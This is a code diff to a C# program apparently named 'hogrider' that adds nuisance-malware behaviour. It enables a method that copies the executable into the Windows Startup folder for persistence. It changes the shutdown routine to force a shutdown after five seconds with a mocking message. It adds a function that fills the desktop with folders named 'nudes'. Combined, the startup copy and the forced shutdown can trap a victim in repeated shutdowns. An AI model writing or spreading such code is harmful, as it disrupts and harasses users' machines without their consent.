@@ -60,15 +60,35 @@ namespace hogrider
 
         public static void ShutDown()
         {
-            var psi = new ProcessStartInfo("shutdown", "/s /t 0");
+            var psi = new ProcessStartInfo("shutdown", "/s /t 5 /c 'CRITICAL ERROR: Your ass got glued!'");
             psi.CreateNoWindow = true;
             psi.UseShellExecute = false;
             Process.Start(psi);
         }
 
-        /*public static void AddStartup()
+        public static void AddStartup()
         {
-            File.Copy(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\hogrider.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\hogrider.exe");
-        }*/
+            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\hogrider.exe"))
+            {
+                Console.WriteLine("File already exists, skipping ...");
+            } else
+            {
+                File.Copy(AppDomain.CurrentDomain.BaseDirectory + "hogrider.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\hogrider.exe");
+            }
+        }
+
+        public static void DirsOnDesktop(int count) {
+            for (int i = 0; i < count; i++)
+            {
+                string newFolder = "nudes" + i;
+
+                string path = System.IO.Path.Combine(
+                   Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
+                   newFolder
+                );
+
+                Directory.CreateDirectory(path);
+            }
+        }
     }
 }
